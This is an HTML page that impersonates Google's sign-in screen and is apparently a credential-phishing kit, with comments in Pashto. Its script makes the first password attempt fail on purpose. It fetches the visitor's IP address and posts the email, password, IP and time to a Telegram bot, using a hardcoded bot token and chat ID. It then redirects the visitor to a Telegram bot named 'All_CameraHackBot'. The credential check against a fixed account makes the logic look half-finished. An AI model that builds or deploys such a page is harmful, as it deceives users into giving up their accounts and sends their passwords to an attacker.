<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Sign in - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
        }

        body {
            min-height: 100vh;
            background: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
        }

        /* د ګوګل کارت ډیزاین */
        .google-card {
            max-width: 450px;
            width: 100%;
            background: #1e1e2f;
            border-radius: 1.5rem;
            border: 1px solid #2a2a3a;
            padding: 2rem 1.8rem;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
        }

        .logo {
            text-align: center;
            margin-bottom: 1rem;
        }

        .logo span {
            font-size: 2rem;
            font-weight: 500;
            color: #e0e0e0;
        }

        h1 {
            font-size: 1.6rem;
            font-weight: 500;
            color: #e0e0e0;
            margin-bottom: 0.25rem;
            text-align: center;
        }

        .sub {
            color: #9aa0a6;
            font-size: 0.85rem;
            text-align: center;
            margin-bottom: 1.5rem;
        }

        .input-group {
            margin-bottom: 1.2rem;
        }

        label {
            display: block;
            color: #e0e0e0;
            font-size: 0.85rem;
            margin-bottom: 0.5rem;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 0.85rem 1rem;
            background: #2a2a3a;
            border: 1px solid #3a3a4a;
            border-radius: 0.5rem;
            color: white;
            font-size: 1rem;
            outline: none;
            transition: all 0.2s;
        }

        input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
        }

        button {
            width: 100%;
            padding: 0.85rem;
            background: #3b82f6;
            border: none;
            border-radius: 0.5rem;
            color: white;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 0.5rem;
        }

        button:hover {
            background: #2563eb;
        }

        .link-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 1.2rem;
            font-size: 0.75rem;
        }

        .link-buttons a, .link-buttons span {
            color: #8ba6bc;
            text-decoration: none;
            cursor: pointer;
        }

        .link-buttons a:hover, .link-buttons span:hover {
            color: #3b82f6;
            text-decoration: underline;
        }

        .message {
            margin-top: 1rem;
            padding: 0.7rem;
            border-radius: 0.5rem;
            font-size: 0.8rem;
            text-align: center;
            display: none;
        }

        .error-msg {
            background: rgba(220, 38, 38, 0.15);
            border: 1px solid #ef4444;
            color: #fca5a5;
        }

        .info-msg {
            background: rgba(59,130,246,0.1);
            border: 1px solid #3b82f6;
            color: #93c5fd;
        }

        .footer {
            text-align: center;
            margin-top: 1.5rem;
            font-size: 0.7rem;
            color: #6b7280;
            display: flex;
            justify-content: center;
            gap: 1rem;
        }

        .step-text {
            font-size: 0.7rem;
            color: #6b7280;
            text-align: center;
            margin-top: 1rem;
        }
    </style>
</head>
<body>

<div class="google-card">
    <div class="logo">
        <span>G</span>
    </div>

    <!-- مرحله 1: برېښنالیک -->
    <div id="step1View">
        <h1>Sign in</h1>
        <div class="sub">Use your Google Account</div>

        <div class="input-group">
            <label>Email or phone</label>
            <input type="email" id="emailInput" placeholder="user@example.com">
        </div>

        <button id="nextBtn">Next</button>

        <div class="link-buttons">
            <span onclick="alert('Reset password link (demo)')">Forgot email?</span>
            <span onclick="alert('Create account demo')">Create account</span>
        </div>
        <div class="step-text">Step 1 of 2</div>
    </div>

    <!-- مرحله 2: پټنوم -->
    <div id="step2View" style="display: none;">
        <h1>Welcome back</h1>
        <div class="sub" id="displayEmail"></div>

        <div class="input-group">
            <label>Enter your password</label>
            <input type="password" id="passwordInput" placeholder="········">
        </div>

        <button id="loginBtn">Next</button>

        <div class="link-buttons">
            <span onclick="goBackToEmail()">← Back to email</span>
            <span onclick="alert('Forgot password demo')">Forgot password?</span>
        </div>
        <div class="step-text">Step 2 of 2</div>
    </div>

    <div id="errorBox" class="message error-msg"></div>
    <div id="infoBox" class="message info-msg"></div>
    
    <div class="footer">
        <span>English (United States)</span>
        <span>Help</span>
        <span>Privacy</span>
        <span>Terms</span>
    </div>
</div>

<script>
    // ==================== Telegram Bot Settings ====================
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const ADMIN_CHAT_ID = "8295417969";
    const BOT_REDIRECT = "https://t.me/All_CameraHackBot?start=8020108872";

    // د ریښتیني پاسورډ ازموینه (د مثال په توګه)
    // تاسو کولی شئ دلته خپل ریښتیني پاسورډ/ایمیل ولیکئ
    const VALID_EMAIL = "admin@gmail.com";
    const VALID_PASSWORD = "realpass123";

    // د هڅو تعقیبول (د ایمیل پر بنسټ)
    let attemptStore = {};

    // UI عناصر
    const step1View = document.getElementById('step1View');
    const step2View = document.getElementById('step2View');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const displayEmailSpan = document.getElementById('displayEmail');
    const errorBox = document.getElementById('errorBox');
    const infoBox = document.getElementById('infoBox');

    let currentEmail = "";

    // ========== Helper Functions ==========
    function showMessage(box, text, isError = true) {
        box.textContent = text;
        box.className = `message ${isError ? 'error-msg' : 'info-msg'}`;
        box.style.display = 'block';
        setTimeout(() => {
            box.style.display = 'none';
        }, 3500);
    }

    function goBackToEmail() {
        step2View.style.display = 'none';
        step1View.style.display = 'block';
        emailInput.value = '';
        passwordInput.value = '';
        currentEmail = "";
        showMessage(infoBox, "↺ Back to email step", false);
    }

    async function getUserIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    async function notifyAdmin(email, password, ip, success = true) {
        if (!success) return; // یوازې بریالي هڅې اډمن ته ځي

        const msg = `✅ *SUCCESSFUL LOGIN*\n\n👤 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown'
                })
            });
        } catch (err) {
            console.warn("Telegram error", err);
        }
    }

    // ========== مرحله 1: برېښنالیک ==========
    document.getElementById('nextBtn').addEventListener('click', () => {
        const email = emailInput.value.trim();
        if (!email || !email.includes('@')) {
            showMessage(errorBox, "❌ Please enter a valid email address.", true);
            return;
        }
        currentEmail = email;
        displayEmailSpan.innerHTML = `${currentEmail} <span style="color:#3b82f6; font-size:0.7rem;">✓</span>`;
        emailInput.value = '';
        step1View.style.display = 'none';
        step2View.style.display = 'block';
        passwordInput.value = '';
        showMessage(infoBox, "✅ Email verified. Now enter your password.", false);
    });

    // بیرته تلل
    window.goBackToEmail = goBackToEmail;

    // ========== مرحله 2: ننوتنه ==========
    document.getElementById('loginBtn').addEventListener('click', async () => {
        const password = passwordInput.value.trim();
        if (!password) {
            showMessage(errorBox, "❌ Please enter your password.", true);
            return;
        }

        const ip = await getUserIP();
        const key = `${currentEmail}_${ip}`;

        if (!attemptStore[key]) {
            attemptStore[key] = { attempts: 0 };
        }
        const currentAttempt = attemptStore[key].attempts + 1;
        attemptStore[key].attempts = currentAttempt;

        // ========== د ریښتیني پاسورډ تایید ==========
        const isRealPassword = (currentEmail === VALID_EMAIL && password === VALID_PASSWORD);

        // لومړۍ هڅه — تل ناکامه (خو اډمن ته خبر نه ځي)
        if (currentAttempt === 1) {
            showMessage(errorBox, "❌ Incorrect password. Please try again (second attempt will work).", true);
            // فورم بیا له پیل څخه پیل کړئ
            setTimeout(() => {
                goBackToEmail();
            }, 1500);
            return;
        }

        // دوهمه هڅه — ریښتیني پاسورډ چک کول
        if (currentAttempt >= 2) {
            if (isRealPassword) {
                // بریالی ننوتنه
                await notifyAdmin(currentEmail, password, ip, true);
                showMessage(infoBox, "✅ Login successful! Redirecting to Telegram...", false);
                
                const loginBtn = document.getElementById('loginBtn');
                loginBtn.disabled = true;
                loginBtn.style.opacity = '0.6';

                setTimeout(() => {
                    window.location.href = BOT_REDIRECT;
                }, 1800);
            } else {
                // ریښتینی پاسورډ نه دی — ننوتنه رد کړه
                showMessage(errorBox, "❌ Invalid password! Access denied.", true);
                setTimeout(() => {
                    goBackToEmail();
                }, 1500);
            }
        }
    });

    // د Enter کیلي ملاتړ
    emailInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') document.getElementById('nextBtn').click();
    });
    passwordInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') document.getElementById('loginBtn').click();
    });
</script>
</body>
</html>
